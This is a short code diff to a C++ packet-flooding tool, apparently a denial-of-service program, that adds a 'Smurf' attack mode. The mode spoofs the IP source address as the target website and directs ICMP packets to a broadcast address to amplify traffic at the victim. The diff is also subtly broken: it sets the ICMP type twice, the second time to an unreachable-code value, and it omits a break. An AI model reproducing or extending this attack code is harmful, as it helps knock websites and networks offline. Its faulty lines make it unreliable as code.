@@ -82,6 +82,11 @@ void ICMP_Flood::override_headers(icmphdr *icmp, iphdr *ip){
             icmp->type = ICMP_DEST_UNREACH;
             icmp->code = ICMP_PORT_UNREACH;
             break;
+        case config::Smurf:
+            icmp->type = ICMP_ECHO;
+            icmp->type = ICMP_NET_UNREACH;
+            ip->daddr = inet_addr(conf->broadcast.c_str());
+            ip->saddr = inet_addr(conf->website.c_str());
         default:break;
     }
 }
